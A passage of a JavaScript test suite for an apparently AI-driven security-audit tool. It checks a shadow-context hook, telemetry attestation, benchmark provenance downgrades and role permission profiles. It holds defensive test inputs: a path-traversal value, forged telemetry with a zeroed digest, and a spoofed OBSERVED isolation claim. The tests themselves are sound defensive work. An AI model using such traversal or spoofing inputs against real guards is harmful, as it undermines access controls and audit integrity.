      throw new Error('HOOK-112 VIOLATION: hook emitted unverified overwrite property');
    }

    // 112.3 view_file on shadow copy in scratch/context: MUST allow
    const vfShadowRes = invokeHook({ name: 'view_file', args: { AbsolutePath: shadowFile112 } });
    if (vfShadowRes.decision !== 'allow') {
      throw new Error(`HOOK-112 VIOLATION: view_file on shadow copy did not allow: ${JSON.stringify(vfShadowRes)}`);
    }

    // 112.4 view_file on unshadowed raw file: MUST deny (Fail-Closed Default-Deny, not pass-through)
    const unshadowedRaw = path.join(srcDir112, 'unshadowed.txt');
    fs.writeFileSync(unshadowedRaw, 'unshadowed', 'utf8');
    const vfUnshadowedRes = invokeHook({ name: 'view_file', args: { AbsolutePath: unshadowedRaw } });
    if (vfUnshadowedRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: view_file on unshadowed file did not fail-closed deny: ${JSON.stringify(vfUnshadowedRes)}`);
    }

    // 112.5 view_file on escaping path: MUST deny (CWE-59 / traversal containment)
    const vfEscapeRes = invokeHook({ name: 'view_file', args: { AbsolutePath: path.resolve(tempFixture112, '../outside.txt') } });
    if (vfEscapeRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: view_file on escaping path did not deny: ${JSON.stringify(vfEscapeRes)}`);
    }

    // 112.6 grep_search: raw SearchPath must deny; shadow SearchPath must allow
    const grepRawRes = invokeHook({ name: 'grep_search', args: { SearchPath: srcDir112, Query: 'token' } });
    if (grepRawRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: grep_search on raw directory did not deny: ${JSON.stringify(grepRawRes)}`);
    }
    const grepShadowRes = invokeHook({ name: 'grep_search', args: { SearchPath: path.join(ctxDir112, 'src'), Query: 'token' } });
    if (grepShadowRes.decision !== 'allow') {
      throw new Error(`HOOK-112 VIOLATION: grep_search on shadow directory did not allow: ${JSON.stringify(grepShadowRes)}`);
    }

    // 112.7 list_dir: raw DirectoryPath must deny; shadow DirectoryPath must allow
    const listRawRes = invokeHook({ name: 'list_dir', args: { DirectoryPath: srcDir112 } });
    if (listRawRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: list_dir on raw directory did not deny: ${JSON.stringify(listRawRes)}`);
    }
    const listShadowRes = invokeHook({ name: 'list_dir', args: { DirectoryPath: path.join(ctxDir112, 'src') } });
    if (listShadowRes.decision !== 'allow') {
      throw new Error(`HOOK-112 VIOLATION: list_dir on shadow directory did not allow: ${JSON.stringify(listShadowRes)}`);
    }

    // 112.8 find_by_name: raw SearchDirectory must deny; shadow SearchDirectory must allow
    const findRawRes = invokeHook({ name: 'find_by_name', args: { SearchDirectory: srcDir112, Pattern: '*.js' } });
    if (findRawRes.decision !== 'deny') {
      throw new Error(`HOOK-112 VIOLATION: find_by_name on raw directory did not deny: ${JSON.stringify(findRawRes)}`);
    }
    const findShadowRes = invokeHook({ name: 'find_by_name', args: { SearchDirectory: path.join(ctxDir112, 'src'), Pattern: '*.js' } });
    if (findShadowRes.decision !== 'allow') {
      throw new Error(`HOOK-112 VIOLATION: find_by_name on shadow directory did not allow: ${JSON.stringify(findShadowRes)}`);
    }

    // 112.9 Empty stdin & contract compliance (Rule 1 non-blocking allow, Rule 2 no CRLF, Rule 3 valid keys)
    const empty112 = execFileSync(process.execPath, [hookScriptPath112], { input: '', encoding: 'utf8', timeout: 5000 });
    if (empty112.includes('\r')) {
      throw new Error('HOOK-112 VIOLATION: hook stdout contains CRLF');
    }
    const empty112Parsed = JSON.parse(empty112);
    if (empty112Parsed.decision !== 'allow') {
      throw new Error('HOOK-112 VIOLATION: empty stdin failed to return allow');
    }
    const allowedKeys112 = new Set(['decision', 'reason', 'permissionOverrides']);
    for (const k of Object.keys(empty112Parsed)) {
      if (!allowedKeys112.has(k)) {
        throw new Error(`HOOK-112 VIOLATION: extraneous key '${k}' in hook output`);
      }
    }

    // 112.10 Pass-through when workspace has no active shadow context manifest
    const noCtxWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'no-ctx-ws-'));
    try {
      const noCtxRes = invokeHook({ name: 'view_file', args: { AbsolutePath: path.join(noCtxWorkspace, 'file.js') } }, [noCtxWorkspace]);
      if (noCtxRes.decision !== 'allow') {
        throw new Error('HOOK-112 VIOLATION: normal workspace with no active shadow context did not allow');
      }
    } finally {
      fs.rmSync(noCtxWorkspace, { recursive: true, force: true });
    }
  } finally {
    fs.rmSync(tempFixture112, { recursive: true, force: true });
  }

  console.log('✔ 112. P0 Invariant: Fail-Closed Shadow Context Guard, Multi-Tool Matcher & Default-Deny Enforcement.');

  // 113. P0 Invariant: Run-Bound Non-Replayable Guard Attestation (F-02)
  const testRoot113 = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-attestation-test-'));
  const trustedArtifacts113 = fs.mkdtempSync(path.join(os.tmpdir(), 'guard-trusted-artifacts-'));
  try {
    const srcDir = path.join(testRoot113, 'src');
    fs.mkdirSync(srcDir, { recursive: true });
    fs.writeFileSync(path.join(srcDir, 'app.js'), 'console.log("hello");\n', 'utf8');

    const prep = prepareReviewContext(testRoot113);
    const validDigest = prep.manifest.manifestDigest;

    // 113.1 Genuine telemetry in artifactDirectoryPath upgrades to OBSERVED
    const genuineEvent = {
      timestamp: new Date().toISOString(),
      conversationId: 'test-conv-123',
      stepIdx: 1,
      modelName: 'UNKNOWN',
      manifestDigest: validDigest,
      tool: 'view_file',
      targetPath: 'src/app.js',
      decision: 'deny',
      action: 'shadow_context_deny',
      reason: 'direct access blocked'
    };
    fs.writeFileSync(
      path.join(trustedArtifacts113, 'shadow-guard-telemetry.jsonl'),
      JSON.stringify(genuineEvent) + '\n',
      'utf8'
    );

    const verifiedFinal = finalizeScan({
      candidates: [],
      repoRoot: testRoot113,
      artifactDirectoryPath: trustedArtifacts113,
      conversationId: 'test-conv-123'
    });
    if (verifiedFinal.summary.execution.contextIsolation.status !== 'OBSERVED') {
      throw new Error(`ATTESTATION VIOLATION: expected OBSERVED, got ${verifiedFinal.summary.execution.contextIsolation.status}`);
    }
    if (verifiedFinal.summary.execution.contextIsolation.guardTelemetry?.source !== 'TRUSTED_ARTIFACT_DIR') {
      throw new Error('ATTESTATION VIOLATION: expected telemetrySource TRUSTED_ARTIFACT_DIR');
    }

    // 113.2 Forged / cross-run telemetry with mismatched manifestDigest strictly fails upgrade
    const forgedEventsFile = path.join(prep.contextRoot, 'guard-events.jsonl');
    const forgedEvent = {
      ...genuineEvent,
      manifestDigest: '0000000000000000000000000000000000000000000000000000000000000000'
    };
    fs.writeFileSync(forgedEventsFile, JSON.stringify(forgedEvent) + '\n', 'utf8');

    const forgedRes = verifyGuardTelemetry({
      shadowRoot: prep.contextRoot,
      manifestDigest: validDigest
    });
    if (forgedRes.verified) {
      throw new Error('ATTESTATION VIOLATION: mismatched manifestDigest was accepted');
    }

    const forgedFinal = finalizeScan({
      candidates: [],
      repoRoot: testRoot113,
      shadowRoot: prep.contextRoot
    });
    if (forgedFinal.summary.execution.contextIsolation.status !== 'MANDATED') {
      throw new Error(`ATTESTATION VIOLATION: forged telemetry expected MANDATED, got ${forgedFinal.summary.execution.contextIsolation.status}`);
    }

    // 113.3 Empty or malformed telemetry file stays MANDATED
    fs.writeFileSync(forgedEventsFile, '   \n\n', 'utf8');
    const emptyRes = verifyGuardTelemetry({ shadowRoot: prep.contextRoot, manifestDigest: validDigest });
    if (emptyRes.verified) {
      throw new Error('ATTESTATION VIOLATION: empty telemetry was accepted');
    }

    // 113.4 Telemetry with illegal raw access allowance fails verification
    const illegalEvent = {
      ...genuineEvent,
      decision: 'allow',
      action: 'shadow_context_allow_raw'
    };
    fs.writeFileSync(forgedEventsFile, JSON.stringify(illegalEvent) + '\n', 'utf8');
    const illegalRes = verifyGuardTelemetry({ shadowRoot: prep.contextRoot, manifestDigest: validDigest });
    if (illegalRes.verified) {
      throw new Error('ATTESTATION VIOLATION: illegal raw allowance telemetry was accepted');
    }

    // 113.5 Direct self-asserted OBSERVED claim without valid telemetry is downgraded under Default-Deny
    fs.rmSync(forgedEventsFile, { force: true });
    const spoofClaimFinal = finalizeScan({
      candidates: [],
      repoRoot: testRoot113,
      contextIsolation: {
        status: 'OBSERVED',
        pipeline: 'SPOOFED_PIPELINE'
      }
    });
    if (spoofClaimFinal.summary.execution.contextIsolation.status !== 'MANDATED') {
      throw new Error(`ATTESTATION VIOLATION: unverified OBSERVED claim was not downgraded to MANDATED`);
    }
  } finally {
    fs.rmSync(testRoot113, { recursive: true, force: true });
    fs.rmSync(trustedArtifacts113, { recursive: true, force: true });
  }

  console.log('✔ 113. P0 Invariant: Run-Bound Non-Replayable Guard Attestation & Default-Deny Telemetry Downgrade.');

  // 114. P1 Invariant: Empirical Benchmark Recorder True Provenance & UNKNOWN Discovery (F-03)
  const testRoot114 = fs.mkdtempSync(path.join(os.tmpdir(), 'recorder-provenance-test-'));
  try {
    // 114.1 probeEnvironment called without active model or overrides defaults to UNKNOWN
    const savedModel = process.env.AGY_MODEL;
    const savedProvider = process.env.AGY_MODEL_PROVIDER;
    delete process.env.AGY_MODEL;
    delete process.env.AGY_MODEL_PROVIDER;

    try {
      const defaultEnv = probeEnvironment(testRoot114);
      if (defaultEnv.modelId !== 'UNKNOWN') {
        throw new Error(`PROVENANCE VIOLATION: expected modelId 'UNKNOWN', got '${defaultEnv.modelId}'`);
      }
      if (defaultEnv.modelProvider !== 'UNKNOWN') {
        throw new Error(`PROVENANCE VIOLATION: expected modelProvider 'UNKNOWN', got '${defaultEnv.modelProvider}'`);
      }
      if (defaultEnv.toolVersion !== TOOL_VERSION) {
        throw new Error(`PROVENANCE VIOLATION: expected toolVersion '${TOOL_VERSION}', got '${defaultEnv.toolVersion}'`);
      }
      if (defaultEnv.toolRevision && defaultEnv.toolRevision !== 'UNCHECKED_REVISION' && !/^[0-9a-f]{40}$/i.test(defaultEnv.toolRevision)) {
        throw new Error(`PROVENANCE VIOLATION: toolRevision format invalid: ${defaultEnv.toolRevision}`);
      }

      // 114.2 Envelope generated from default probe validates cleanly against schema
      const envelope = createBenchmarkRunEnvelope({
        repoRoot: testRoot114,
        candidates: [],
        environment: defaultEnv
      });
      const valEnv = validateBenchmarkRunEnvelope(envelope);
      if (!valEnv.valid) {
        throw new Error(`PROVENANCE VIOLATION: envelope validation failed: ${valEnv.errors.join(', ')}`);
      }

      // 114.3 verifyToolSelfIntegrity returns accurate toolVersion and toolRevision
      const selfIntegrity = verifyToolSelfIntegrity();
      if (selfIntegrity.toolVersion !== TOOL_VERSION) {
        throw new Error(`PROVENANCE VIOLATION: verifyToolSelfIntegrity toolVersion mismatch: ${selfIntegrity.toolVersion}`);
      }
      if (selfIntegrity.toolRevision !== defaultEnv.toolRevision) {
        throw new Error(`PROVENANCE VIOLATION: verifyToolSelfIntegrity toolRevision mismatch`);
      }
    } finally {
      if (savedModel !== undefined) process.env.AGY_MODEL = savedModel;
      if (savedProvider !== undefined) process.env.AGY_MODEL_PROVIDER = savedProvider;
    }
  } finally {
    fs.rmSync(testRoot114, { recursive: true, force: true });
  }

  console.log('✔ 114. P1 Invariant: Empirical Benchmark Recorder True Provenance & UNKNOWN Discovery.');

  // 115. P0 Invariant: Evaluator enforces Default-Deny on evidenceOrigin & TCB Integrity
  const testRoot115 = fs.mkdtempSync(path.join(os.tmpdir(), 'evaluator-default-deny-test-'));
  try {
    const mockCands = [
      { id: 'C1', ruleId: 'CWE-862', location: { uri: 'test.js', startLine: 10 } }
    ];

    // 115.1 Self-asserted MODEL_OBSERVED with dirty tool (toolDirty: true) strictly downgrades to RECORDED_SYNTHETIC
    const envDirty = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'MODEL_OBSERVED',
      executionKind: 'LIVE_AGENT',
      candidates: mockCands,
      environment: {
        modelId: 'gemini-2.5-flash',
        modelProvider: 'google',
        toolDirty: true,
        toolIntegrityDigest: 'abcdef1234567890'
      }
    });
    const resDirty = evaluateStability([envDirty, { ...envDirty, runId: 'run-dirty-2' }], testRoot115);
    if (resDirty.evaluationMode !== 'RECORDED_SYNTHETIC') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_SYNTHETIC for dirty tool, got ${resDirty.evaluationMode}`);
    }
    if (resDirty.modelDependentRun !== 'NO (Deterministic Synthetic Generator)') {
      throw new Error(`INVARIANT 115 VIOLATION: expected NO (Deterministic Synthetic Generator) for dirty tool, got ${resDirty.modelDependentRun}`);
    }

    // 115.2 Self-asserted MODEL_OBSERVED with null toolIntegrityDigest strictly downgrades to RECORDED_SYNTHETIC
    const envNullDigest = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'MODEL_OBSERVED',
      executionKind: 'LIVE_AGENT',
      candidates: mockCands,
      environment: {
        modelId: 'gemini-2.5-flash',
        modelProvider: 'google',
        toolDirty: false,
        toolIntegrityDigest: null
      }
    });
    const resNullDigest = evaluateStability([envNullDigest, { ...envNullDigest, runId: 'run-null-digest-2' }], testRoot115);
    if (resNullDigest.evaluationMode !== 'RECORDED_SYNTHETIC') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_SYNTHETIC for null digest, got ${resNullDigest.evaluationMode}`);
    }

    // 115.3 Self-asserted MODEL_OBSERVED with UNKNOWN model strictly downgrades to RECORDED_SYNTHETIC
    const envUnknownModel = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'MODEL_OBSERVED',
      executionKind: 'LIVE_AGENT',
      candidates: mockCands,
      environment: {
        modelId: 'UNKNOWN',
        modelProvider: 'google',
        toolDirty: false,
        toolIntegrityDigest: 'abcdef1234567890'
      }
    });
    const resUnknownModel = evaluateStability([envUnknownModel, { ...envUnknownModel, runId: 'run-unknown-2' }], testRoot115);
    if (resUnknownModel.evaluationMode !== 'RECORDED_SYNTHETIC') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_SYNTHETIC for UNKNOWN model, got ${resUnknownModel.evaluationMode}`);
    }

    // 115.4 Explicit SYNTHETIC run envelope strictly evaluates to RECORDED_SYNTHETIC
    const envSynthetic = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'SYNTHETIC',
      executionKind: 'SIMULATED_HARNESS',
      candidates: mockCands
    });
    const resSynthetic = evaluateStability([envSynthetic, { ...envSynthetic, runId: 'run-synth-2' }], testRoot115);
    if (resSynthetic.evaluationMode !== 'RECORDED_SYNTHETIC' || resSynthetic.modelDependentRun !== 'NO (Deterministic Synthetic Generator)') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_SYNTHETIC for synthetic envelope`);
    }

    // 115.5 IMPORTED run envelope evaluates to RECORDED_IMPORTED
    const envImported = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'IMPORTED',
      executionKind: 'REPLAY_LOG',
      candidates: mockCands
    });
    const resImported = evaluateStability([envImported, { ...envImported, runId: 'run-import-2' }], testRoot115);
    if (resImported.evaluationMode !== 'RECORDED_IMPORTED' || resImported.modelDependentRun !== 'YES (External Provenance)') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_IMPORTED for imported envelope`);
    }

    // 115.6 Clean MODEL_OBSERVED with clean TCB evaluates to RECORDED_EMPIRICAL
    const envCleanObserved = createBenchmarkRunEnvelope({
      repoRoot: testRoot115,
      evidenceOrigin: 'MODEL_OBSERVED',
      executionKind: 'LIVE_AGENT',
      candidates: mockCands,
      environment: {
        modelId: 'gemini-2.5-flash',
        modelProvider: 'google',
        toolDirty: false,
        toolIntegrityDigest: 'a1b2c3d4e5f67890123456789abcdef012345678'
      }
    });
    const resClean = evaluateStability([envCleanObserved, { ...envCleanObserved, runId: 'run-clean-2' }], testRoot115);
    if (resClean.evaluationMode !== 'RECORDED_EMPIRICAL' || resClean.modelDependentRun !== 'YES (Observed Multi-Pass)') {
      throw new Error(`INVARIANT 115 VIOLATION: expected RECORDED_EMPIRICAL for clean observed run`);
    }

    // 115.7 Missing or invalid evidenceOrigin fails schema validation fail-closed
    const badOrigin = validateBenchmarkRunEnvelope({
      ...envCleanObserved,
      evidenceOrigin: 'FORGED_ORIGIN'
    });
    if (badOrigin.valid) {
      throw new Error('INVARIANT 115 VIOLATION: invalid evidenceOrigin passed validation');
    }
  } finally {
    fs.rmSync(testRoot115, { recursive: true, force: true });
  }

  console.log('✔ 115. P0 Invariant: Evaluator enforces Default-Deny on evidenceOrigin & TCB Integrity.');

  // 116. P0 Invariant: Holdout Generalization Benchmark Ground-Truth & Symmetrical Dual-Control
  const holdoutResult = runHoldoutEval(process.cwd(), 1);
  if (holdoutResult.failed > 0 || holdoutResult.total !== 20) {
    throw new Error('P0 VIOLATION: runHoldoutEval failed to pass 20 holdout disposition ground-truth invariant cases');
  }
  if (holdoutResult.tp !== 10 || holdoutResult.tn !== 9 || holdoutResult.fp !== 0 || holdoutResult.fn !== 0 || holdoutResult.disputed !== 1) {
    throw new Error(`P0 VIOLATION: runHoldoutEval failed dual-control symmetry (expected TP=10, TN=9, FP=0, FN=0, DISPUTED=1; got TP=${holdoutResult.tp}, TN=${holdoutResult.tn}, FP=${holdoutResult.fp}, FN=${holdoutResult.fn}, DISPUTED=${holdoutResult.disputed})`);
  }
  console.log('✔ 116. P0 Invariant: Holdout Generalization Benchmark Ground-Truth & Symmetrical Dual-Control.');

  // 117. P0 Invariant: Hermetic Telemetry Isolation & Default-Deny on Untrusted Workspace Telemetry
  const tempDir117 = fs.mkdtempSync(path.join(os.tmpdir(), 'test-hermetic-telemetry-'));
  try {
    const contextDir117 = path.join(tempDir117, 'scratch', 'context');
    fs.mkdirSync(contextDir117, { recursive: true });
    const eventsFile117 = path.join(contextDir117, 'guard-events.jsonl');
    const dummyEvent = {
      timestamp: new Date().toISOString(),
      tool: 'view_file',
      targetPath: 'src/app.js',
      decision: 'deny',
      action: 'ALLOWED_SHADOW',
      reason: 'direct access blocked'
    };
    fs.writeFileSync(eventsFile117, JSON.stringify(dummyEvent) + '\n', 'utf8');

    // finalizeScan without contextPrep must ignore ambient workspace guard telemetry
    const scan117 = finalizeScan({ repoRoot: tempDir117 });
    if (scan117.summary.execution.contextIsolation.status !== 'MANDATED') {
      throw new Error(`P0-117 VIOLATION: Expected contextIsolation.status === 'MANDATED', got ${scan117.summary.execution.contextIsolation.status}`);
    }
    if (scan117.summary.execution.contextIsolation.guardTelemetry !== null) {
      throw new Error('P0-117 VIOLATION: Expected guardTelemetry === null for unmanifested workspace telemetry');
    }

    // verifyGuardTelemetry directly with untrusted shadowRoot but no manifestDigest strictly rejects
    const verifyRes117 = verifyGuardTelemetry({ shadowRoot: contextDir117 });
    if (verifyRes117.verified !== false || verifyRes117.reason !== 'UNTRUSTED_TELEMETRY_REQUIRES_MANIFEST_BINDING') {
      throw new Error(`P0-117 VIOLATION: Expected UNTRUSTED_TELEMETRY_REQUIRES_MANIFEST_BINDING, got ${JSON.stringify(verifyRes117)}`);
    }

    // validateCandidateSet: verify strict schema conformance and boundary rejections
    const validCandidateSet = {
      schemaVersion: '1.0.0',
      candidates: [
        {
          id: 'CAND-01',
          ruleId: 'CWE-89',
          title: 'SQL Injection in Query Handler',
          securityProperty: 'safe-resource-handling',
          findingType: 'VULNERABILITY',
          proofKind: 'STATIC_TRACE',
          severity: 'HIGH',
          location: {
            uri: 'src/db.js',
            startLine: 10,
            endLine: 12
          }
        }
      ]
    };
    const validRes = validateCandidateSet(validCandidateSet);
    if (!validRes.valid || validRes.errors.length > 0) {
      throw new Error(`P0-117 VIOLATION: Expected valid candidate set, got errors: ${validRes.errors.join('; ')}`);
    }

    // Rejection of unexpected root property
    const extraRootRes = validateCandidateSet({ ...validCandidateSet, unexpectedField: 'bad' });
    if (extraRootRes.valid || !extraRootRes.errors.some(e => e.includes('Unexpected root property'))) {
      throw new Error('P0-117 VIOLATION: Expected rejection of unexpected root property');
    }

    // Rejection of candidate with unexpected property
    const badCandObj = { ...validCandidateSet.candidates[0], maliciousField: true };
    const extraCandPropRes = validateCandidateSet({ candidates: [badCandObj] });
    if (extraCandPropRes.valid || !extraCandPropRes.errors.some(e => e.includes('unexpected property'))) {
      throw new Error('P0-117 VIOLATION: Expected rejection of candidate with unexpected property');
    }

    // Rejection of invalid severity enum
    const badSevCand = { ...validCandidateSet.candidates[0], severity: 'INVALID_SEV' };
    const badSevRes = validateCandidateSet({ candidates: [badSevCand] });
    if (badSevRes.valid || !badSevRes.errors.some(e => e.includes('severity must be one of'))) {
      throw new Error('P0-117 VIOLATION: Expected rejection of invalid severity enum');
    }

    // Rejection of endLine < startLine
    const invertedLineCand = {
      ...validCandidateSet.candidates[0],
      location: { uri: 'src/db.js', startLine: 10, endLine: 5 }
    };
    const invertedLineRes = validateCandidateSet({ candidates: [invertedLineCand] });
    if (invertedLineRes.valid || !invertedLineRes.errors.some(e => e.includes('cannot be less than startLine'))) {
      throw new Error('P0-117 VIOLATION: Expected rejection of endLine < startLine');
    }

    // Rejection of unexpected location property
    const extraLocCand = {
      ...validCandidateSet.candidates[0],
      location: { uri: 'src/db.js', startLine: 10, extraLocField: 123 }
    };
    const extraLocRes = validateCandidateSet({ candidates: [extraLocCand] });
    if (extraLocRes.valid || !extraLocRes.errors.some(e => e.includes('unexpected property'))) {
      throw new Error('P0-117 VIOLATION: Expected rejection of unexpected location property');
    }
  } finally {
    fs.rmSync(tempDir117, { recursive: true, force: true });
  }
  console.log('✔ 117. P0 Invariant: Hermetic Telemetry Isolation & Default-Deny on Untrusted Workspace Telemetry.');

  // 118. P0 Invariant: Stream-JSON First-Party Telemetry & Coordinator Agent Specification
  const coordPath = path.resolve(process.cwd(), 'agents/security-audit-coordinator.md');
  if (!fs.existsSync(coordPath)) {
    throw new Error('P0-118 VIOLATION: Expected agent missing: agents/security-audit-coordinator.md');
  }
  const coordContent = fs.readFileSync(coordPath, 'utf8');
  const coordFrontmatter = parseAgentFrontmatter(coordContent);
  if (!coordFrontmatter) {
    throw new Error('P0-118 VIOLATION: Failed to parse YAML frontmatter of security-audit-coordinator.md');
  }
  if (coordFrontmatter.name !== 'security-audit-coordinator') {
    throw new Error(`P0-118 VIOLATION: Expected agent name 'security-audit-coordinator', got '${coordFrontmatter.name}'`);
  }
  if (coordFrontmatter.mainAgent !== true || coordFrontmatter.subagent !== false) {
    throw new Error('P0-118 VIOLATION: security-audit-coordinator must declare mainAgent: true and subagent: false');
  }
  if (!AGY_COMMAND_EXECUTION_POLICIES.includes(coordFrontmatter.commandExecutionPolicy) || coordFrontmatter.commandExecutionPolicy !== 'sandbox') {
    throw new Error(`P0-118 VIOLATION: security-audit-coordinator commandExecutionPolicy must be in [${AGY_COMMAND_EXECUTION_POLICIES.join(', ')}] and specifically equal 'sandbox', got '${coordFrontmatter.commandExecutionPolicy}'`);
  }
  const expectedCoordTools = ['invoke_subagent', 'send_message', 'manage_subagents', 'view_file', 'list_dir', 'run_command'];
  for (const t of expectedCoordTools) {
    if (!Array.isArray(coordFrontmatter.tools) || !coordFrontmatter.tools.includes(t)) {
      throw new Error(`P0-118 VIOLATION: security-audit-coordinator tools must include '${t}'`);
    }
  }

  // Test parseStreamJsonTrace against mock NDJSON trace
  const mockTraceNdjson = [
    JSON.stringify({
      event: 'init',
      conversation_id: 'conv-test-118-telemetry',
      init: {
        tools: ['view_file', 'list_dir', 'grep_search', 'run_command', 'invoke_subagent'],
        permission_mode: 'always-proceed'
      }
    }),
    JSON.stringify({
      event: 'step_update',
      step_update: {
        conversation_id: 'conv-test-118-telemetry',
        step_index: 1,
        tool: 'view_file',
        usage: {
          input_tokens: 1500,
          output_tokens: 300,
          thinking_tokens: 50,
          cache_read_tokens: 100,
          total_tokens: 1950
        }
      }
    }),
    JSON.stringify({
      event: 'step_update',
      step_update: {
        conversation_id: 'conv-test-118-telemetry',
        step_index: 2,
        tool_call: {
          name: 'invoke_subagent',
          args: { agent: 'discovery-agent' }
        },
        usage: {
          input_tokens: 500,
          output_tokens: 100,
          thinking_tokens: 0,
          cache_read_tokens: 0,
          total_tokens: 600
        }
      }
    }),
    JSON.stringify({
      event: 'result',
      result: {
        conversation_id: 'conv-test-118-telemetry',
        status: 'SUCCESS',
        response: JSON.stringify({ schemaVersion: '1.0.0', candidates: [] }),
        duration_seconds: 3.45
      }
    })
  ].join('\n');

  const expectedDigest = crypto.createHash('sha256').update(mockTraceNdjson, 'utf8').digest('hex');
  const traceParsed = parseStreamJsonTrace(mockTraceNdjson);
  if (!traceParsed.success) {
    throw new Error(`P0-118 VIOLATION: parseStreamJsonTrace failed: ${traceParsed.error}`);
  }
  if (traceParsed.telemetry.conversationId !== 'conv-test-118-telemetry') {
    throw new Error(`P0-118 VIOLATION: Expected conversationId 'conv-test-118-telemetry', got ${traceParsed.telemetry.conversationId}`);
  }
  if (!traceParsed.telemetry.toolsUsed.includes('view_file') || !traceParsed.telemetry.toolsUsed.includes('invoke_subagent')) {
    throw new Error(`P0-118 VIOLATION: Expected toolsUsed to include view_file and invoke_subagent, got ${JSON.stringify(traceParsed.telemetry.toolsUsed)}`);
  }
  if (!traceParsed.telemetry.subagentsInvoked.includes('discovery-agent')) {
    throw new Error(`P0-118 VIOLATION: Expected subagentsInvoked to include discovery-agent, got ${JSON.stringify(traceParsed.telemetry.subagentsInvoked)}`);
  }
  if (traceParsed.telemetry.telemetryDigest !== expectedDigest) {
    throw new Error(`P0-118 VIOLATION: Expected digest ${expectedDigest}, got ${traceParsed.telemetry.telemetryDigest}`);
  }
  if (traceParsed.telemetry.tokenUsage.inputTokens !== 2000 || traceParsed.telemetry.tokenUsage.outputTokens !== 400 || traceParsed.telemetry.tokenUsage.totalTokens !== 2550) {
    throw new Error(`P0-118 VIOLATION: Unexpected tokenUsage: ${JSON.stringify(traceParsed.telemetry.tokenUsage)}`);
  }

  // Validate envelope with executionTelemetry
  const envelopeWithTelem = createBenchmarkRunEnvelope({
    runId: 'run-test-118-telemetry',
    benchmarkMode: 'DISCOVERY',
    evidenceOrigin: 'MODEL_OBSERVED',
    executionKind: 'LIVE_AGENT',
    target: {
      repositoryName: 'test-repo',
      repositoryUri: 'https://github.com/test/repo',
      commitSha: 'a'.repeat(40)
    },
    environment: {
      agyVersion: '1.3.0',
      modelId: 'gemini-3.8-flash-high',
      modelProvider: 'google',
      os: 'win32',
      nodeVersion: process.version
    },
    candidates: [],
    executionTelemetry: traceParsed.telemetry
  });
  const envValResult = validateBenchmarkRunEnvelope(envelopeWithTelem);
  if (!envValResult.valid) {
    throw new Error(`P0-118 VIOLATION: validateBenchmarkRunEnvelope rejected valid envelope with telemetry: ${envValResult.errors.join('; ')}`);
  }

  // Fail-Closed Invariant: Status ERROR returns success: false under Default-Deny
  const errorTrace = [
    JSON.stringify({ event: 'init', init: { tools: ['view_file'] } }),
    JSON.stringify({ event: 'result', result: { status: 'ERROR', error: 'Upstream model quota exceeded' } })
  ].join('\n');
  const errorParsed = parseStreamJsonTrace(errorTrace);
  if (errorParsed.success !== false || !errorParsed.error) {
    throw new Error('P0-118 VIOLATION: parseStreamJsonTrace must fail-closed on result.status === ERROR');
  }

  // Fail-Closed Invariant: Premature truncated stream without result or response returns success: false
  const truncatedTrace = JSON.stringify({ event: 'init', init: { tools: ['view_file'] } });
  const truncatedParsed = parseStreamJsonTrace(truncatedTrace);
  if (truncatedParsed.success !== false || !truncatedParsed.error) {
    throw new Error('P0-118 VIOLATION: parseStreamJsonTrace must fail-closed on premature stream truncation');
  }

  // Fail-Closed Invariant: validateBenchmarkRunEnvelope rejects negative token usage
  const invalidTelemEnvelope = JSON.parse(JSON.stringify(envelopeWithTelem));
  invalidTelemEnvelope.executionTelemetry.tokenUsage.inputTokens = -50;
  const invalidTelemVal = validateBenchmarkRunEnvelope(invalidTelemEnvelope);
  if (invalidTelemVal.valid) {
    throw new Error('P0-118 VIOLATION: validateBenchmarkRunEnvelope must reject negative token usage in executionTelemetry');
  }

  console.log('✔ 118. P0 Invariant: Stream-JSON First-Party Telemetry & Coordinator Agent Specification.');

  // 119. P0 Invariant: Recommended Role Permissions Profile & 4-Layer Defense-in-Depth Sandbox Model
  const profPath119 = path.resolve(process.cwd(), 'recommended-security-audit-permissions.json');
  if (!fs.existsSync(profPath119)) {
    throw new Error('P0-119 VIOLATION: recommended-security-audit-permissions.json missing from repository root');
  }
  const prof119 = JSON.parse(fs.readFileSync(profPath119, 'utf8'));
  const val119 = validatePermissionsProfile(prof119);
  if (!val119.valid || val119.errors.length > 0) {
    throw new Error(`P0-119 VIOLATION: recommended-security-audit-permissions.json failed validation: ${val119.errors.join('; ')}`);
  }

  // 119.1 Fail-closed tamper tests against validatePermissionsProfile:
  // Missing role
  const badRole119 = JSON.parse(JSON.stringify(prof119));
  delete badRole119.roles.discovery;
  if (validatePermissionsProfile(badRole119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted profile with missing discovery role');
  }

  // Write allowed in discovery
  const writeDisc119 = JSON.parse(JSON.stringify(prof119));
  writeDisc119.roles.discovery.allow.push('write_to_file');
  if (validatePermissionsProfile(writeDisc119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted write_to_file in discovery role');
  }

  // Command execution allowed in verifiers
  const cmdVer119 = JSON.parse(JSON.stringify(prof119));
  cmdVer119.roles.verifiers.allow.push('run_command');
  if (validatePermissionsProfile(cmdVer119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted command execution in verifiers role');
  }

  // Network egress allowed in coordinator
  const netCoord119 = JSON.parse(JSON.stringify(prof119));
  netCoord119.roles.coordinator.allow.push('read_url_content');
  if (validatePermissionsProfile(netCoord119).valid) {
    throw new Error('P0-119 VIOLATION: validatePermissionsProfile accepted network egress in coordinator role');
  }

